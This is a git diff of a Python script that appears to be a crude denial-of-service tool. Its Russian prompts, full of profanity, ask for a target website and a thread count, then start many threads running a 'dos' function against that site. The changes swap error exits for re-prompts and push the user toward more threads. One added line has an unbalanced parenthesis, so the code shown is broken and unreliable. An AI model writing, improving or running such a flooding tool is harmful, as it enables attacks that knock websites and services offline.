@@ -13,7 +13,7 @@ banner = """
 |                                                    |
 | [--] GitHub:  https://github.com/CamelStyle        |
 |                                                    |
-| [--] Version: 0.2                                  |
+| [--] Version: 0.3                                  |
 |____________________________________________________|
 """
 print (banner)
@@ -41,18 +41,26 @@ url = input("ДАВАЙ САЙТ СЮДА: ")
 try:
     threads = int(input("Количество ПОТОКОВ БЛТЬ: "))
 except ValueError:
-    exit("Ебучее кол-во потоков неправильное!")
+    print("Ебучее кол-во потоков неправильное!")
+    threads = int(input("ДАВАЙ еще потоки - ")
 
-if threads == 0:
-    exit("тоже, нихуя не верные потоки, пробуй еще!")
+if threads <= 10:
+    print("тоже, нихуя не верные потоки, пробуй еще!")
+if threads <= 10:
+    print("Больше, БОЛЬШЕ ПОТОКОВ, БЛТЬ!")
+
 
 if not url.__contains__("http"):
-    exit("а, кароч, ссылка не http или https формат!")
+    print("а, кароч, ссылка не http или https формат!")
+    url = input("ДАВАЙ САЙТ СЮДА: ")
 
 if not url.__contains__("."):
-    exit("хУЁВЫй домеН")
+    print("хУЁВЫй домеН")
+    url = input("ДАВАЙ САЙТ СЮДА: ")
 
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     thr.start()
     print(str(i + 1) + " ПОТОКИ ХУЯРЯТСЯ, МОЛОДЕЦ!")
+
+    
